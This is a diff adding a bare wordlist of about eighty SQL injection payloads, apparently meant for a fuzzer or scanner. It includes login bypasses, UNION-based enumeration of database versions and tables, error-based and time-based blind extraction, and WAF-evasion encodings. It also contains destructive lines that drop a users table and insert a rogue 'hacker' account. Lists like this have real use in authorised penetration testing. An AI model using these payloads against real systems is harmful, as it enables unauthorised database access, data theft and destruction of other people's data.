@@ -1,0 +1,81 @@
+' OR '1'='1
+" OR "1"="1"
+' OR 1=1 -- 
+' OR 1=1#
+' OR 1=1/*
+test' OR '1'='1
+admin' --
+admin' #
+admin'/*
+admin" --
+admin" #
+' OR '1'='1'/*
+' OR 1=1--%20
+1' OR '1'='1
+1" OR "1"="1
+1' OR 1=1; -- 
+1' AND 1=1; -- 
+1' AND 1=2; -- 
+1 AND 1=1
+1 AND 1=2
+1' AND 1=1 -- 
+1' AND 1=2 -- 
+' OR 'a'='a
+' OR 3>2 --
+' OR 3<2 --
+' OR 1<2 --
+1' UNION SELECT 1,version() --
+1' UNION SELECT 1,2,version() --  
+1' UNION SELECT 1,2,3,version() --
+1' UNION SELECT 1,2,3,4,version() --  
+1' UNION SELECT 1,2,3,4,5,version() --
+1' UNION SELECT 1,2,3,4,5,6,version() --
+1' UNION SELECT 1,2,3,4,5,6,7,version() --
+1' UNION SELECT 1,2,3,4,5,6,7,8,version() --
+1' UNION SELECT NULL, NULL -- 
+1' UNION SELECT NULL, NULL, NULL --
+1' UNION ALL SELECT NULL,version(),NULL -- 
+1' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables -- 
+' UNION SELECT 1, sqlite_version(), 3 --
+' UNION SELECT 1, sqlite_version() --
+' UNION SELECT 1, tbl_name, 3 FROM sqlite_master --
+' UNION SELECT NULL, version(), NULL --
+' UNION SELECT NULL, current_user, NULL --
+1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x5c,(SELECT USER()), 0x5c, FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) -- 
+1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT USER()))) -- 
+1' AND UPCATEXML(1, CONCAT(0x5c, (SELECT USER())), 1) --
+' AND 1=@@version --
+' AND 1=db_name() --
+' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables) --
+' AND 1=CAST(version() AS INT) --
+' AND 1=CAST(current_user AS INT) --
+' AND 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1)) --
+1 AND (SELECT 5=5 AND (SELECT SLEEP(5)))
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND 'a'='a
+' OR SLEEP(5) --
+" OR SLEEP(5) --
+' AND 1=pg_sleep(5) --
+'; SELECT pg_sleep(5) --
+' WAITFOR DELAY '0:0:5' -- 
+';WAITFOR DELAY '0:0:5'--
+1;WAITFOR DELAY '0:0:5'--
+' AND 1=dbms_pipe.receive_message('RDS', 5) --
+' AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2)))) --
+'; DROP TABLE users; --
+'; SELECT * FROM users; --
+'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned'); --
+%55nion(%53elect 1,2,3)--
++UNION+SELECT+1,2,3--
+/**/UNION/**/SELECT/**/1,2,3--
+/*!UNION*/+/*!SELECT*/+1,2,3--
+UnIoN/**/SeLeCt/**/1,2,3--
+# Versioned Comments (MySQL)
+/*!50000UNION*/+/*!50000SELECT*/+1,2,3--
+1'/**/OR/**/1=1--
+1'/**/AND/**/1=1--
+0x554e494f4e 0x53454c454354
+SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
+1';WAITFOR DELAY '0:0:5'--
+'))--
+')) OR 1=1 -- 
+") OR 1=1 --
